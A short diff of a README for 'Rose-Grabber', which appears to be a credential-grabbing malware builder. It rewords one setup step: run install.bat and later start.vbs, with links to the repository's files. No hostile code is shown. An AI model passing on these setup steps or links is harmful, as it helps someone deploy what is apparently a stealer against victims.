@@ -109,7 +109,7 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 **By virtue of our sophisticated installation process, manual installation of Python is rendered unnecessary. Our meticulously designed batch script adeptly manages this procedure on your behalf.**
 + Download the repository by clicking [here](https://github.com/DamagingRose/Rose-Grabber/archive/refs/heads/main.zip).
 + Extract the ZIP folder which you just downloaded.
-+ Run the [`install.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/components/install.bat) to have the [`builder`](https://github.com/DamagingRose/Rose-Grabber/blob/main/components/roseui/v8.pyw) open automatically. To start the program later on, you will need to run the [start.vbs](https://github.com/DamagingRose/Rose-Grabber/blob/main/start.vbs).
++ Run the [`install.bat`](https://github.com/DamagingRose/Rose-Grabber/blob/main/components/install.bat) to install Rose and then open the UI. To start the program later on, you will need to run the [`start.vbs`](https://github.com/DamagingRose/Rose-Grabber/blob/main/start.vbs).
 
 ## Preview
 <div align="center">
